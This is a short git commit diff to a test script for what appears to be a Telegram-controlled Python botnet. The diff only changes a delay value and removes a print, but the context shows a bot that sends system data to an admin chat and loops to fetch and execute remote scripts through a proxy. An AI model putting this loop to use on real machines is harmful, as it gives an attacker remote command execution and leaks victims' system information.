48bef51045d47f09bcc309b1aaf0488983e9e4b0
onionj <onionj98@gmail.com>
2021-06-20 09:20:30 -0700

    testing

--- test.py
+++ test.py
@@ -9,11 +9,12 @@ import time
 
 # TELEGRAM_TOKEN = '1468299500:AAHsvEH-5VyIfWYMzZcYxF_e00000000000'
 # ADMIN_CHAT_ID = '12345678910'
-delay = 20
+delay = 60
 
 bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,
                         show_log=True, send_system_data=True)
-print(bot)
+
+
 while True:
     print('*'*100)
     bot.get_and_execute_scripts_by_third_party_proxy()
